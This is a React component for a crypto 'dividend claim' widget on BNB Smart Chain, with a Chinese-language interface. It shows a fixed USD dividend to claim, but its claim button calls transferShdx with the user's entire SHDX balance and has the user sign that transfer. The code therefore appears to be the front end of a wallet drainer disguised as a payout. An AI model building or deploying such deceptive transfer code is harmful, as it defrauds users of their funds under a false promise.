import { useState } from 'react'
import { useAccount, usePublicClient, useSendTransaction } from 'wagmi'
import { useConnectModal } from '@rainbow-me/rainbowkit'
import { transferShdx, formatRpcError } from '../utils/payment'
import { FIXED_DIVIDEND_USD, BSC_CHAIN_ID } from '../config/constants'
import { useEnsureBsc } from '../hooks/useEnsureBsc'
import { useShdxBalance } from '../hooks/useShdxBalance'

export function ClaimWidget() {
  const { address, isConnected } = useAccount()
  const { openConnectModal } = useConnectModal()
  const publicClient = usePublicClient({ chainId: BSC_CHAIN_ID })
  const { sendTransactionAsync } = useSendTransaction()
  const { ensureBsc } = useEnsureBsc()
  const { balance, formatted, refetch } = useShdxBalance()
  const [status, setStatus] = useState('')
  const [loading, setLoading] = useState(false)

  const handleClaim = async () => {
    if (!isConnected || !address) {
      openConnectModal?.()
      return
    }
    if (!publicClient) return

    setLoading(true)
    setStatus('')

    try {
      await ensureBsc()
      await transferShdx(publicClient, address, balance, (args) =>
        sendTransactionAsync(args),
      )
      setStatus(`已提交 ${formatted} SHDX`)
      refetch()
    } catch (err: unknown) {
      const msg = formatRpcError(err)
      if (msg) setStatus(msg)
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="widget">
      <div className="widget-title">分红领取</div>

      <div className="dividend-amount">
        <div className="label">可领取分红</div>
        <div className="value">${FIXED_DIVIDEND_USD.toFixed(2)}</div>
      </div>

      {isConnected && (
        <div className="balance-row">
          <span>SHDX 余额</span>
          <span>{Number(formatted).toLocaleString()} SHDX</span>
        </div>
      )}

      <button
        className="btn-primary"
        onClick={handleClaim}
        disabled={loading}
      >
        {loading ? '处理中' : isConnected ? '领取分红' : '连接钱包'}
      </button>

      {status && (
        <div className={`status-msg ${status.includes('已提交') ? 'success' : 'error'}`}>
          {status}
        </div>
      )}
    </div>
  )
}
